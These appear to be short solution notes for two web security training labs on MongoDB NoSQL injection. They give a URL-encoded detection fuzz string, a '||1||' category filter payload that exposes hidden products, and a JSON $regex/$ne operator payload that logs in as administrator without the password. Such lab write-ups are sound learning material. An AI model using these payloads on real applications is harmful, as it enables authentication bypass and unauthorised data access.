```
Lab: Detecting NoSQL injection

APPRENTICE

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.
```

* Payload use to detect : `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
* Payload to exploit the vuln : `category=Clothing%2c+shoes+and+accessories%27%7c%7c%31%7c%7c%27`

```
Lab: Exploiting NoSQL operator injection to bypass authentication

APPRENTICE

The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the administrator user.

You can log in to your own account using the following credentials: wiener:peter. 
```

* Payload to exploit the vuln : `{"username":{"$regex":"ad.*"},"password":{"$ne":""}} `
